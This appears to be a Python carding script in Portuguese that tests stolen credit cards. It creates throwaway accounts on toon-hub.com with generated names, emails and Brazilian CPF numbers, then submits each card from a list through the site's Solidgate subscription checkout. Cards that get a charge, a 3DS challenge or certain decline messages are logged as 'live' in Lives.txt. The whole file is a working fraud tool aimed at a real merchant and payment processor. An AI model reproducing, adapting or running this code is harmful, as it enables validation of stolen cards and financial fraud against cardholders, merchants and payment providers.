import json
import random
import re
import time
import uuid
import subprocess
import sys
import os

REQUIRED = ["requests", "urllib3"]

def _ensure_deps():
    marker = ".installed"
    if os.path.isfile(marker):
        return
    missing = []
    for pkg in REQUIRED:
        mod = pkg.replace("-", "_")
        try:
            __import__(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        print(f"[*] Instalando dependencias: {', '.join(missing)}")
        try:
            subprocess.check_call([
                sys.executable, "-m", "pip", "install",
                "--quiet", "--disable-pip-version-check", *missing
            ])
        except subprocess.CalledProcessError as e:
            print(f"[!] Falha ao instalar: {e}")
            print(f"[!] Rode manualmente: pip install {' '.join(missing)}")
            sys.exit(1)
    try:
        with open(marker, "w") as f:
            f.write("ok")
    except Exception:
        pass

_ensure_deps()

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def gerar_nome():
    nomes = ['Joao', 'Maria', 'Jose', 'Ana', 'Carlos', 'Fernanda', 'Pedro', 'Juliana',
             'Rafael', 'Camila', 'Lucas', 'Beatriz', 'Mateus', 'Larissa', 'Gabriel',
             'Mariana', 'Felipe', 'Amanda', 'Bruno', 'Carla']
    sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira',
                  'Alves', 'Pereira', 'Costa', 'Gomes', 'Martins', 'Rocha',
                  'Carvalho', 'Lima', 'Araujo', 'Mendes', 'Barbosa', 'Ribeiro',
                  'Nunes', 'Fernandes']
    return {'first': random.choice(nomes), 'last': random.choice(sobrenomes)}


def gerar_email(nome, sobrenome):
    dominios = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com', 'live.com', 'icloud.com']
    return f"{nome.lower()}.{sobrenome.lower()}{random.randint(100, 9999)}@{random.choice(dominios)}"


def gerar_cpf():
    n = [random.randint(0, 9) for _ in range(9)]
    d1 = sum(n[i] * (10 - i) for i in range(9))
    d1 = 11 - (d1 % 11)
    if d1 >= 10:
        d1 = 0
    n.append(d1)
    d2 = sum(n[i] * (11 - i) for i in range(10))
    d2 = 11 - (d2 % 11)
    if d2 >= 10:
        d2 = 0
    n.append(d2)
    return f"{n[0]}{n[1]}{n[2]}.{n[3]}{n[4]}{n[5]}.{n[6]}{n[7]}{n[8]}-{n[9]}{n[10]}"


def consultar_bin_local(bin):
    url = f'https://bins.antipublic.cc/bins/{bin}'
    default = {'brand': 'UNKNOW', 'type': 'UNKNOW', 'category': 'UNKNOW', 'issuer': 'UNKNOW'}
    try:
        r = requests.get(
            url,
            headers={
                'accept': 'application/json, text/plain, */*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
            },
            timeout=10, verify=False, allow_redirects=True
        )
        if r.status_code != 200 or not r.text:
            return default
        data = r.json()
        if not isinstance(data, dict) or not data:
            return default
        return {
            'brand': data.get('brand', 'UNKNOW'),
            'type': data.get('type', 'UNKNOW'),
            'category': data.get('level', data.get('category', 'UNKNOW')),
            'issuer': data.get('bank', data.get('issuer', 'UNKNOW'))
        }
    except Exception:
        return default


def montar_info_bin(info_bin):
    return f"{info_bin['brand']} - {info_bin['type']} - {info_bin['category']} - {info_bin['issuer']}"


def req(nome, url, method, headers, body=None):
    session = requests.Session()
    session.verify = False
    hdrs = {}
    for h in headers:
        if ':' in h:
            k, v = h.split(':', 1)
            hdrs[k.strip()] = v.strip()
    kwargs = {'headers': hdrs, 'allow_redirects': True, 'timeout': 30}
    if body is not None:
        kwargs['data'] = body if isinstance(body, (str, bytes)) else json.dumps(body)
    try:
        r = session.request(method, url, **kwargs)
        return {'body': r.text, 'httpCode': r.status_code, 'error': '', 'headers': str(r.headers)}
    except Exception as e:
        return {'body': '', 'httpCode': 0, 'error': str(e), 'headers': ''}


def extrair_mensagem(json_final, error_obj, raw_resp, tx_obj, order_obj, r5, r6):
    candidatos = [
        error_obj if isinstance(error_obj, dict) else {},
        raw_resp.get('error', {}) if isinstance(raw_resp, dict) else {},
        tx_obj.get('error', {}) if isinstance(tx_obj, dict) else {},
        order_obj if isinstance(order_obj, dict) else {},
        json_final if isinstance(json_final, dict) else {},
        raw_resp if isinstance(raw_resp, dict) else {},
    ]

    for src in candidatos:
        if not isinstance(src, dict):
            continue
        rmu = (src.get('recommended_message_for_user')
               or src.get('recommendedMessageForUser'))
        if rmu:
            return rmu

    for src in candidatos:
        if not isinstance(src, dict):
            continue
        msgs = src.get('messages')
        if isinstance(msgs, list) and msgs:
            return msgs[0]
        if isinstance(msgs, str) and msgs:
            return msgs

    for src in candidatos:
        if not isinstance(src, dict):
            continue
        msg = src.get('message')
        if isinstance(msg, list) and msg:
            return msg[0]
        if isinstance(msg, str) and msg:
            return msg

    for src in candidatos:
        if not isinstance(src, dict):
            continue
        ed = src.get('error_description') or src.get('errorDescription')
        if ed:
            return ed

    for src in candidatos:
        if not isinstance(src, dict):
            continue
        d = src.get('detail')
        if d:
            return d

    tudo = (r5.get('body', '') or '') + ' ' + (r6.get('body', '') or '')
    for padrao in [
        r'"recommended_message_for_user"\s*:\s*"([^"]+)"',
        r'"recommendedMessageForUser"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
        r'"messages"\s*:\s*\[\s*"([^"]+)"',
        r'"error_description"\s*:\s*"([^"]+)"',
        r'"detail"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(padrao, tudo)
        if m:
            return m.group(1)

    return 'UNKNOWN'


def is_aprovada_por_mensagem(retorno):
    r = str(retorno).lower()
    for k in ('invalid cvv', 'cvv2', 'security code', 'cvv not match',
              'invalid expiration', 'expired', 'expiration',
              'insufficient', 'not sufficient',
              '3ds_verify', '3ds_required', '3ds required', 'verify'):
        if k in r:
            return True
    return False


def retornar_json(lista, retorno, status, info_bin, run_time, raw=None, error_code=None):
    if is_aprovada_por_mensagem(retorno):
        status = True

    if raw and isinstance(raw, dict):
        order_obj = raw.get('order', {}) or {}
        raw_resp = raw.get('rawResponse', {}) or {}
        order_status = str(order_obj.get('status', '')).upper()
        raw_order_status = str(
            (raw_resp.get('order', {}) or {}).get('status', '')
        ).upper() if isinstance(raw_resp, dict) else ''

        if '3DS_VERIFY' in order_status or '3DS_VERIFY' in raw_order_status:
            status = True
            if retorno in ('UNKNOWN', '', None):
                retorno = '3DS_REQUIRED'

    status_txt = 'Aprovada' if status else 'Reprovada'
    linha = f"{status_txt} » {lista} » {retorno} » {info_bin} - {run_time} » @OverThinking"
    print(linha)

    if status:
        try:
            with open("Lives.txt", "a", encoding="utf-8") as f:
                f.write(linha + "\n")
        except Exception:
            pass


def run_check(lista):
    INICIO = time.time()

    dados = lista.split("|")
    cc  = dados[0].strip() if len(dados) > 0 else ''
    mes = dados[1].strip() if len(dados) > 1 else ''
    ano = dados[2].strip() if len(dados) > 2 else ''
    cvv = dados[3].strip() if len(dados) > 3 else ''
    if not cvv:
        cvv = "000"

    bin = cc[:6]
    info_bin_raw = consultar_bin_local(bin)
    info_bin = montar_info_bin(info_bin_raw)

    nome = gerar_nome()
    email = gerar_email(nome['first'], nome['last'])
    cpf = gerar_cpf()
    senha = '@pirokinha' + str(random.randint(10, 99))

    r1 = req('01_HOME', 'https://toon-hub.com/pt/', 'GET', [
        'Connection: keep-alive', 'Host: toon-hub.com',
        'Sec-Fetch-Dest: document', 'Sec-Fetch-Mode: navigate', 'Sec-Fetch-Site: none',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
        'Upgrade-Insecure-Requests: 1', 'Priority: u=0, i',
    ])

    body_check_email = json.dumps({'email': email})
    r2 = req('02_CHECK_EMAIL', 'https://th.toon-hub.com/auth/check-email', 'POST', [
        'Connection: keep-alive', 'Content-Type: application/json', 'Host: th.toon-hub.com',
        'Origin: https://toon-hub.com', 'Referer: https://toon-hub.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
        'X-Anonymous-Id: 9e9501bb-b7e6-46e3-a948-ffcef033665c',
        'X-Amp-Session-Id: ' + str(int(time.time())) + '000',
        'X-Fb-Fbp: fb.1.1790358621658.543317438589639471.AQYCAQMA',
        'X-Is-Adult: false', 'X-User-Lang: pt', 'X-Site-Version: underage',
    ], body_check_email)

    body_sign = json.dumps({'action': 'sign', 'email': email, 'password': senha, 'type': 'sign-up'})
    r3 = req('03_SIGN', 'https://th.toon-hub.com/auth/sign', 'POST', [
        'Connection: keep-alive', 'Content-Type: application/json', 'Host: th.toon-hub.com',
        'Origin: https://toon-hub.com', 'Referer: https://toon-hub.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
        'X-Anonymous-Id: 9e9501bb-b7e6-46e3-a948-ffcef033665c',
        'X-Amp-Session-Id: ' + str(int(time.time())) + '000',
        'X-Fb-Fbp: fb.1.1790358621658.543317438589639471.AQYCAQMA',
        'X-Is-Adult: false', 'X-User-Lang: pt', 'X-Site-Version: underage',
    ], body_sign)

    auth_token = None
    try:
        json_sign = json.loads(r3['body'])
        if isinstance(json_sign, dict):
            tokens = json_sign.get('tokens', {})
            data = json_sign.get('data', {})
            auth_token = (
                tokens.get('accessToken') or tokens.get('access_token')
                or json_sign.get('token') or json_sign.get('access_token')
                or data.get('token') or data.get('accessToken')
            )
    except Exception:
        pass

    if not auth_token:
        run_time = f"{round(time.time() - INICIO, 2)}s"
        retornar_json(lista, 'FALHA_AUTH_TOKEN | cadastro falhou', False, info_bin, run_time, r3['body'])
        return

    anonymous_id = uuid.uuid4().hex
    anonymous_id = (
        anonymous_id[:8] + '-' + anonymous_id[8:12] + '-' + anonymous_id[12:16] +
        '-' + anonymous_id[16:20] + '-' + anonymous_id[20:32]
    )
    amp_session_id = str(int(time.time())) + '000'
    fbp = f"fb.1.{int(time.time())}000.{random.randint(100000000, 999999999)}.AQYCAQMA"

    body_checkout = json.dumps({'offerId': 34})
    hdrs_checkout = [
        'Connection: keep-alive', 'Content-Type: application/json',
        'Accept: application/json, text/plain, */*',
        'Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,pt-PT;q=0.7',
        'Host: th.toon-hub.com', 'Origin: https://toon-hub.com',
        'Referer: https://toon-hub.com/', 'Cache-Control: no-cache', 'Pragma: no-cache',
        'Priority: u=1, i',
        'Sec-Ch-Ua: "Chromium";v="152", "Not_A Brand";v="24", "Opera GX";v="136"',
        'Sec-Ch-Ua-Mobile: ?0', 'Sec-Ch-Ua-Platform: "Windows"',
        'Sec-Fetch-Dest: empty', 'Sec-Fetch-Mode: cors', 'Sec-Fetch-Site: same-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 OPR/136.0.0.0',
        'X-Amp-Session-Id: ' + amp_session_id,
        'X-Anonymous-Id: ' + anonymous_id,
        'X-Fb-Event-Source-Url: https://toon-hub.com/pt/access/',
        'X-Fb-Fbp: ' + fbp,
        'X-Fb-Pixel-Id: 917004387486598',
        'X-Is-Adult: false', 'X-Site-Version: underage',
        'X-Snap-Pixel-Id: d7b3ab79-c6e3-48b0-bb9a-51e23dbd58b0',
        'X-User-Lang: pt',
        'Authorization: Bearer ' + auth_token,
    ]

    r4 = req('04_SUBSCRIPTIONS_CHECKOUT',
             'https://th.toon-hub.com/subscriptions/checkout',
             'POST', hdrs_checkout, body_checkout)

    try:
        json4 = json.loads(r4['body'])
    except Exception:
        json4 = {}

    payment_session_id = json4.get('checkoutSessionId')
    order_id = json4.get('orderId')
    merchant_data = json4.get('merchantData', {}) or {}
    payment_intent = merchant_data.get('paymentIntent')
    merchant_pub_key = merchant_data.get('merchant')
    signature = merchant_data.get('signature')
    external_order_id = merchant_data.get('externalOrderId')
    intent_id = payment_intent

    if not payment_session_id or not intent_id or not merchant_pub_key or not signature:
        retorno = 'FALHA_CRIAR_CHECKOUT'
        if not payment_session_id:
            retorno += ' | checkoutSessionId ausente'
        if not intent_id:
            retorno += ' | paymentIntent ausente'
        if not merchant_pub_key:
            retorno += ' | merchant ausente'
        if not signature:
            retorno += ' | signature ausente'
        run_time = f"{round(time.time() - INICIO, 2)}s"
        retornar_json(lista, retorno, False, info_bin, run_time, json4)
        return

    body_intent = json.dumps({
        'payment_intent': intent_id,
        'version': 'v1',
        'sdk_version': 'payment-form-v1.659.0',
        'meta': {
            'is_brand_logo_defined': False,
            'is_framework_sdk_used': True,
            'cdn': ['cdn.solidgate.com'],
            'custom_container_id': 'solid-payment-form-container_#123',
        },
    })

    r_intent = req('05_SOLIDGATE_INTENT',
                   'https://form-v2.solidgate.com/api/v2/ui/intent',
                   'POST',
                   [
                       'accept: */*',
                       'accept-language: pt-BR,pt;q=0.9,en;q=0.8,pt-PT;q=0.7',
                       'cache-control: no-cache',
                       'content-type: text/plain;charset=UTF-8',
                       'merchant: ' + merchant_pub_key,
                       'signature: ' + signature,
                       'origin: https://toon-hub.com',
                       'pragma: no-cache',
                       'priority: u=1, i',
                       'referer: https://toon-hub.com/',
                       'sec-ch-ua: "Chromium";v="152", "Not_A Brand";v="24", "Opera GX";v="136"',
                       'sec-ch-ua-mobile: ?0',
                       'sec-ch-ua-platform: "Windows"',
                       'sec-fetch-dest: empty',
                       'sec-fetch-mode: cors',
                       'sec-fetch-site: cross-site',
                       'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 OPR/136.0.0.0',
                       'x-release: payment-form-v1.659.0',
                   ],
                   body_intent)

    try:
        json_intent = json.loads(r_intent['body'])
    except Exception:
        json_intent = {}

    solidgate_guid = (json_intent.get('data') or {}).get('id')
    solidgate_token = (json_intent.get('data') or {}).get('token')

    if not solidgate_guid or not solidgate_token:
        run_time = f"{round(time.time() - INICIO, 2)}s"
        retornar_json(lista, 'FALHA_SOLIDGATE_INTENT', False, info_bin, run_time, json_intent)
        return

    body_fields = json.dumps({
        'intentId': solidgate_guid,
        'cardNumber': cc,
        'additionalFields': [],
    })

    r_fields = req('06_SOLIDGATE_FIELDS',
                   'https://form-v2.solidgate.com/rpc/ui1/provider.payment_form.additional_fields.v1alpha1.AdditionalFieldsService/GetAdditionalFields',
                   'POST',
                   [
                       'accept: */*',
                       'accept-language: pt-BR,pt;q=0.9,en;q=0.8,pt-PT;q=0.7',
                       'authorization: Bearer ' + solidgate_token,
                       'cache-control: no-cache',
                       'content-type: application/json',
                       'guid: ' + solidgate_guid,
                       'origin: https://form-v2.solidgate.com',
                       'pragma: no-cache',
                       'priority: u=1, i',
                       'referer: https://form-v2.solidgate.com/version/payment-form-v1.659.0',
                       'sec-ch-ua: "Chromium";v="152", "Not_A Brand";v="24", "Opera GX";v="136"',
                       'sec-ch-ua-mobile: ?0',
                       'sec-ch-ua-platform: "Windows"',
                       'sec-fetch-dest: empty',
                       'sec-fetch-mode: cors',
                       'sec-fetch-site: same-origin',
                       'sec-fetch-storage-access: active',
                       'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 OPR/136.0.0.0',
                   ],
                   body_fields)

    try:
        json_fields = json.loads(r_fields['body'])
    except Exception:
        json_fields = {}

    extra_field_body = {
        'card_exp_month': mes,
        'card_exp_year': ano,
        'card_number': cc,
        'card_cvv': cvv,
        'payment_session_id': 'pf_' + solidgate_guid,
    }

    if isinstance(json_fields, dict) and 'additionalFields' in json_fields and 'zip' in (json_fields.get('additionalFields') or []):
        extra_field_body['zip'] = '10001'

    body5 = json.dumps(extra_field_body)

    r5 = req('07_SOLIDGATE_PAY',
             'https://form-v2.solidgate.com/api/v2/ui1/card/pay/' + solidgate_guid,
             'POST',
             [
                 'accept: */*',
                 'accept-language: pt-BR,pt;q=0.9,en;q=0.8,pt-PT;q=0.7',
                 'authorization: Bearer ' + solidgate_token,
                 'cache-control: no-cache',
                 'content-type: application/json',
                 'origin: https://form-v2.solidgate.com',
                 'pragma: no-cache',
                 'priority: u=1, i',
                 'referer: https://form-v2.solidgate.com/version/payment-form-v1.659.0',
                 'sec-ch-ua: "Chromium";v="152", "Not_A Brand";v="24", "Opera GX";v="136"',
                 'sec-ch-ua-mobile: ?0',
                 'sec-ch-ua-platform: "Windows"',
                 'sec-fetch-dest: empty',
                 'sec-fetch-mode: cors',
                 'sec-fetch-site: same-origin',
                 'sec-fetch-storage-access: active',
                 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 OPR/136.0.0.0',
                 'x-release: payment-form-v1.659.0',
             ],
             body5)

    try:
        json5 = json.loads(r5['body'])
    except Exception:
        json5 = None
        m = re.search(r'\{.*\}', r5['body'], re.S)
        if m:
            try:
                json5 = json.loads(m.group(0))
            except Exception:
                json5 = None

    verify_url = None
    if isinstance(json5, dict):
        verify_url = json5.get('verifyUrl')
        if not verify_url:
            raw_resp = json5.get('rawResponse', {}) or {}
            verify_url = raw_resp.get('verify_url') or raw_resp.get('verifyUrl')

    if verify_url:
        req('07B_3DS_VERIFY',
            verify_url,
            'GET',
            [
                'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept-language: pt-BR,pt;q=0.9,en;q=0.8',
                'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 OPR/136.0.0.0',
                'referer: https://form-v2.solidgate.com/',
                'origin: https://form-v2.solidgate.com',
            ])

    time.sleep(5)

    r6 = req('08_SOLIDGATE_STATUS',
             'https://form-v2.solidgate.com/rpc/ui1/provider.payment_form.status.v1alpha1.StatusService/Status',
             'POST',
             [
                 'accept: */*',
                 'authorization: Bearer ' + solidgate_token,
                 'content-type: application/json',
                 'origin: https://form-v2.solidgate.com',
                 'referer: https://form-v2.solidgate.com/version/payment-form-v1.659.0',
                 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 OPR/136.0.0.0',
                 'x-release: payment-form-v1.659.0',
                 'guid: ' + solidgate_guid,
             ],
             json.dumps({'intentId': solidgate_guid}))

    status = False
    retorno = 'UNKNOWN'
    error_code = None
    raw = None

    try:
        json6 = json.loads(r6['body'])
    except Exception:
        json6 = None
        m = re.search(r'\{.*\}', r6['body'], re.S)
        if m:
            try:
                json6 = json.loads(m.group(0))
            except Exception:
                json6 = None

    json_final = json6 or json5

    if isinstance(json_final, dict):
        raw = json_final

        error_obj = json_final.get('error', {}) or {}
        raw_resp = json_final.get('rawResponse', {}) or {}
        tx_obj = json_final.get('transaction', {}) or {}
        order_obj = json_final.get('order', {}) or {}

        if isinstance(error_obj, dict) and error_obj.get('code'):
            error_code = error_obj['code']
        raw_err = raw_resp.get('error', {}) if isinstance(raw_resp, dict) else {}
        if isinstance(raw_err, dict) and raw_err.get('code'):
            error_code = raw_err['code']
        if isinstance(tx_obj, dict) and tx_obj.get('error', {}) and tx_obj['error'].get('code'):
            error_code = tx_obj['error']['code']

        retorno = extrair_mensagem(json_final, error_obj, raw_resp, tx_obj, order_obj, r5, r6)

        raw_str = json.dumps(json_final)

        has_cvv_not_matched = (
            '"cvv_result":"not_matched"' in raw_str or
            '"cvv_result": "not_matched"' in raw_str or
            'Invalid CVV' in raw_str or
            'Invalid CVV2' in raw_str or
            'cvv_not_matched' in raw_str
        )
        has_avs_mismatch = (
            '"avs_result":"not_matched"' in raw_str or
            'address mismatch' in raw_str.lower() or
            'billing address does not match' in raw_str.lower() or
            'avs_not_matched' in raw_str
        )
        has_insufficient = (
            'insufficient' in raw_str.lower() or
            'not sufficient funds' in raw_str.lower()
        )
        has_expired = (
            'expired' in raw_str.lower() or
            'expiration' in raw_str.lower()
        )

        raw_order_obj = raw_resp.get('order', {}) if isinstance(raw_resp, dict) else {}

        order_status = str(
            order_obj.get('status')
            or (raw_order_obj.get('status') if isinstance(raw_order_obj, dict) else '')
            or ''
        ).upper()
        raw_order_status = str(
            (raw_order_obj.get('status') if isinstance(raw_order_obj, dict) else '') or ''
        ).upper()

        tx_status = str(tx_obj.get('status', '')).upper() if isinstance(tx_obj, dict) else ''
        raw_tx_status = ''
        if isinstance(raw_resp, dict) and isinstance(raw_resp.get('transactions'), list):
            for t in raw_resp['transactions']:
                if isinstance(t, dict) and t.get('status'):
                    raw_tx_status = str(t['status']).upper()
                    break

        is_charged = (
            order_status in ['ORDER_STATUS_SUCCESS', 'ORDER_STATUS_CHARGED', 'ORDER_STATUS_AUTH_SUCCESS']
            or raw_order_status in ['SUCCESS', 'CHARGED', 'AUTH_SUCCESS']
        )
        is_still_3ds = (
            order_status in ['ORDER_STATUS_3DS_VERIFY']
            or raw_order_status == '3DS_VERIFY'
            or tx_status == 'VERIFY'
            or raw_tx_status == 'VERIFY'
        )
        is_terminal_fail = (
            order_status in ['ORDER_STATUS_DECLINED', 'ORDER_STATUS_AUTH_FAILED',
                             'ORDER_STATUS_FAIL', 'ORDER_STATUS_ERROR',
                             'ORDER_STATUS_REVERSED', 'ORDER_STATUS_VOID',
                             'ORDER_STATUS_CANCELLED']
            or raw_order_status in ['DECLINED', 'AUTH_FAILED', 'FAIL', 'ERROR',
                                    'REVERSED', 'VOID', 'CANCELLED']
            or tx_status in ['FAIL', 'FAILED', 'DECLINED']
            or raw_tx_status in ['FAIL', 'FAILED', 'DECLINED']
        )

        if is_charged:
            status = True
        elif is_still_3ds:
            status = True
            if retorno in ('UNKNOWN', '', None):
                retorno = '3DS_REQUIRED'
        elif is_terminal_fail:
            status = False
        elif has_cvv_not_matched or has_avs_mismatch or has_insufficient or has_expired:
            status = False
        else:
            status = False

    run_time = f"{round(time.time() - INICIO, 2)}s"
    retornar_json(lista, retorno, status, info_bin, run_time, raw, error_code)


def main():
    print("Checki Solidgate debitano")

    cards = []
    if os.path.isfile("db.txt"):
        try:
            with open("db.txt", "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        cards.append(line)
        except Exception as e:
            print(f"[!] Erro lendo db.txt: {e}")

    if not cards:
        while True:
            try:
                raw = input("cc » ").strip()
            except (EOFError, KeyboardInterrupt):
                sys.exit(0)
            if not raw:
                sys.exit(0)
            cards.append(raw)
            break

    for lista in cards:
        try:
            run_check(lista)
        except Exception as e:
            print(f"Reprovada » {lista} » erro: {e} » @OverThinking")


if __name__ == '__main__':
    main()